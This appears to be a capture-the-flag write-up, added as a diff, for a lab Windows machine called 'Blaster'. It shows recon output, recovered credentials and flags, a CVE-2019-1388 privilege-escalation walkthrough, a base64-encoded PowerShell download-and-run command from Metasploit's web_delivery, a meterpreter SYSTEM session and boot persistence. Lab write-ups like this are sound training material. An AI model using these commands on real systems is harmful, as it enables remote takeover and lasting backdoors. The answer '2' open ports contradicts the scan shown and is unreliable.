@@ -1,0 +1,220 @@
+IP: 10.10.131.20 
+
+Questions:
+
+Nmap scan results:
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/blaster# nmap -A -T4 10.10.119.201 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 13:39 IST
+Nmap scan report for 10.10.119.201
+Host is up (0.18s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3306/tcp open  mysql         MySQL (unauthorized)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: RETROWEB
+|   NetBIOS_Domain_Name: RETROWEB
+|   NetBIOS_Computer_Name: RETROWEB
+|   DNS_Domain_Name: RetroWeb
+|   DNS_Computer_Name: RetroWeb
+|   Product_Version: 10.0.14393
+|_  System_Time: 2020-10-27T08:09:57+00:00
+| ssl-cert: Subject: commonName=RetroWeb
+| Not valid before: 2020-10-26T08:02:53
+|_Not valid after:  2021-04-27T08:02:53
+|_ssl-date: 2020-10-27T08:10:05+00:00; 0s from scanner time.
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/27%OT=80%CT=1%CU=42958%PV=Y%DS=2%DC=T%G=Y%TM=5F97D5
+OS:DD%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=3%ISR=10E%TI=I%CI=I%TS=A)SEQ(SP=F
+OS:E%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M505NW8ST11%O2=M505NW8ST
+OS:11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M505NW8ST11%O6=M505ST11)WIN(W1=2000
+OS:%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M505
+OS:NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W
+OS:=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
+OS:T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S
+OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=
+OS:Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G
+OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-10-27T08:10:00
+|_  start_date: 2020-10-27T08:03:25
+
+TRACEROUTE (using port 8888/tcp)
+HOP RTT       ADDRESS
+1   147.38 ms 10.9.0.1
+2   182.71 ms 10.10.119.201
+
+
+1) How many ports are open on our target system?
+-> 2
+
+2) Looks like there's a web server running, what is the title of the page we discover when browsing to it?
+-> IIS Windows Server
+
+Fuzzing the web server using wfuzz.
+
+root@LAPTOP-U5913CMD:/opt/SecLists/Discovery/Web-Content# wfuzz -c -z file,directory-list-2.3-medium.txt --hc 404 http://10.10.119.201/FUZZ 
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named 'shodan'
+libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named 'shodan'
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.119.201/FUZZ
+Total requests: 220560
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                                                              
+===================================================================
+
+000000002:   200        31 L     55 W     703 Ch      "#"                                                                                                                  
+000000003:   200        31 L     55 W     703 Ch      "# Copyright 2007 James Fisher"                                                                                      
+000000005:   200        31 L     55 W     703 Ch      "# This work is licensed under the Creative Commons"                                                                 
+000000001:   200        31 L     55 W     703 Ch      "# directory-list-2.3-medium.txt"                                                                                    
+000000004:   200        31 L     55 W     703 Ch      "#"                                                                                                                  
+000000006:   200        31 L     55 W     703 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                      
+000000007:   200        31 L     55 W     703 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                    
+000000008:   200        31 L     55 W     703 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                                                         
+000000009:   200        31 L     55 W     703 Ch      "# Suite 300, San Francisco, California, 94105, USA."                                                                
+000000010:   200        31 L     55 W     703 Ch      "#"                                                                                                                  
+000000011:   200        31 L     55 W     703 Ch      "# Priority ordered case sensative list, where entries were found"                                                   
+000000012:   200        31 L     55 W     703 Ch      "# on atleast 2 different hosts"                                                                                     
+000000013:   200        31 L     55 W     703 Ch      "#"                                                                                                                  
+000000014:   200        31 L     55 W     703 Ch      ""                                                                                                                   
+000004975:   301        1 L      10 W     150 Ch      "retro" 
+
+3) Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?
+-> /retro
+Name: Tron
+
+4) Navigate to our discovered hidden directory, what potential username do we discover?
+-> Wade
+
+Wade
+December 9, 2019
+
+Leaving myself a note here just in case I forget how to spell it: parzival
+
+5) Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?
+-> parzival
+
+To get logged into Remote Desktop we can make the use of Remmina.
+
+6) Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?
+
+-> THM{HACK_PLAYER_ONE}
+
+
+Breaching the Control Room
+
+1) When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and 
+see if you can find the CVE which was researched on this server. What CVE was it? 
+
+-> CVE-2019-1388
+
+2) Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?
+-> Found this file in the Recycle bin directory.
+-> hhupd.exe
+
+There is a privilege escalation vulnerability in the Windows Certificate Dialog allowing an attacker to elevate privileges to NT AUTHORITY\SYSTEM,
+ it is documented as CVE-2019-1388.
+
+
+So what we can do is restore the executable and then do the following things.
+
+1) Open the executable and click on the show publisher's certificate.
+2) Then open the link on the web browser and click on the settings icon to the top right.
+3) Click on save as and go to System32 and then enable viewing of all the files using the expression *.*
+4) Right on the cmd executable and open it.
+5) If you will type whoami then you will be nt authority/system
+
+And now we can read the contents of root.txt.
+
+Adoption into the Collective:
+
+Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.
+
+msf6 exploit(multi/script/web_delivery) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.9.81.62:4444 
+[*] Using URL: http://0.0.0.0:8080/tsffT5Qy5e
+[*] Local IP: http://172.27.188.94:8080/tsffT5Qy5e
+[*] Server started.
+msf6 exploit(multi/script/web_delivery) > [*] Run the following command on the target machine:
+powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABFAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAEUALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABFAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOQAuADgAMQAuADYAMgA6ADgAMAA4ADAALwB0AHMAZgBmAFQANQBRAHkANQBlAC8AdgBaAHgAUwBkADYAWgBhAEcAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADkALgA4ADEALgA2ADIAOgA4ADAAOAAwAC8AdABzAGYAZgBUADUAUQB5ADUAZQAnACkAKQA7AA==
+
+
+Copy this script and paste it in the terminal
+
+sf6 exploit(multi/script/web_delivery) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > sysinfo
+Computer        : RETROWEB
+OS              : Windows 2016+ (10.0 Build 14393).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+
+
+Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup. 
+-> run persistence -X
+
+meterpreter > run persistence -h
+
+[!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
+[!] Example: run exploit/windows/local/persistence OPTION=value [...]
+Meterpreter Script for creating a persistent backdoor on a target host.
+
+OPTIONS:
+
+    -A        Automatically start a matching exploit/multi/handler to connect to the agent
+    -L <opt>  Location in target host to write payload to, if none %TEMP% will be used.
+    -P <opt>  Payload to use, default is windows/meterpreter/reverse_tcp.
+    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
+    -T <opt>  Alternate executable template to use
+    -U        Automatically start the agent when the User logs on
+    -X        Automatically start the agent when the system boots
+    -h        This help menu
+    -i <opt>  The interval in seconds between each connection attempt
+    -p <opt>  The port on which the system running Metasploit is listening
+    -r <opt>  The IP of the system running Metasploit listening for the connect back
+
+meterpreter > 
+
+For more details related to persistence,you guys can check out this website.
+https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/
